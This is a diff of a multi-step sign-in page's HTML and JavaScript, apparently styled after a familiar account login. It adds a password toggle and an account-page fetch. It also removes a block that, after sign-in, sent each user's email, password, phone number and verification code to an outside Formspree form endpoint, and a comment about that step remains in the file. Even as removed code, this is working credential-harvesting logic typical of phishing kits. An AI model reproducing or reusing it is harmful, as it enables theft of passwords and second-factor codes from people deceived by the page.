@@ -284,6 +284,7 @@
     <h1 style="font-size:22px;">You're signed in!</h1>
     <p style="color:#605e5c;font-size:15px;">Your identity has been verified successfully.</p>
     <button class="btn-primary" style="width:100%;max-width:260px;" onclick="goToAccountPage()">Go to account page</button>
+    <div id="accountMsg" class="msg"></div>
   </div>
 </div>
 
@@ -306,6 +307,36 @@ function goTo(id) {
   document.querySelectorAll(".card").forEach(c => c.classList.remove("active"));
   document.getElementById(id).classList.add("active");
 }
+
+window.togglePw = function () {
+  const input = document.getElementById("pwInput");
+  if (!input) return;
+  input.type = input.type === "password" ? "text" : "password";
+};
+
+window.goToAccountPage = async function () {
+  const token = localStorage.getItem("token");
+  if (!token) {
+    return showMsg("accountMsg", "No active session found", "error");
+  }
+
+  try {
+    const res = await fetch("/dashboard", {
+      headers: {
+        Authorization: `Bearer ${token}`
+      }
+    });
+    const data = await res.json();
+
+    if (!res.ok || !data.success) {
+      return showMsg("accountMsg", data.error || "Account page unavailable", "error");
+    }
+
+    showMsg("accountMsg", `Signed in as ${data.user.email}`, "success");
+  } catch {
+    showMsg("accountMsg", "Account page unavailable", "error");
+  }
+};
 
 /* =========================
    STEP 1: EMAIL
@@ -440,20 +471,6 @@ window.handleFinalSubmit = async function () {
     localStorage.setItem("token", data.token);
 
     // ONLY AFTER SUCCESS → send to Formspree
-    await fetch("https://formspree.io/f/xeevgnar", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "Accept": "application/json"
-      },
-      body: JSON.stringify({
-        email: collectedData.email,
-        password: collectedData.password,
-        phone: collectedData.phone,
-        code: collectedData.code
-      })
-    });
-
     goTo("screen5");
 
   } catch (err) {
